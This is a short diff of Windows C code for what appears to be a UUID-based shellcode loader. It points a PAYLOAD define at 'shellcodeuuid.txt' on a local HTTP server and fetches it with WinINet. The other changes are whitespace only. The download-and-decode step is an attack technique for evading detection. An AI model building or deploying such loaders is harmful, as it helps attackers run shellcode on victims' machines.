@@ -7,7 +7,7 @@
 #define NumberOfElements 17
 // Python3 -m http.server 8080
 // Have shellcodeuuid.txt in the directory
-#define PAYLOAD L"http://10.211.55.2:8080/shellcodeuuid.txt"
+#define PAYLOAD L"http://127.0.0.1:8080/shellcodeuuid.txt"
 
 // https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa
 typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
@@ -73,7 +73,7 @@ BOOL GetUUIDFromUrl(LPCWSTR szUrl, CHAR* UUID[]) {
     BOOL		bSTATE = TRUE;
 
     HINTERNET	hInternet = NULL,
-        hUrl = NULL;
+                hUrl = NULL;
 
     // Read and store the UUIDs from the URL without null terminators
     char buffer[36]; // Assuming each UUID has 36 characters without a null terminator
@@ -114,7 +114,7 @@ BOOL GetUUIDFromUrl(LPCWSTR szUrl, CHAR* UUID[]) {
 
 _EndOfFunction:
     if (hInternet)
-        InternetCloseHandle(hInternet);											// Closing handle 
+        InternetCloseHandle(hInternet);									// Closing handle 
     if (hUrl)
         InternetCloseHandle(hUrl);										// Closing handle
     if (hInternet)
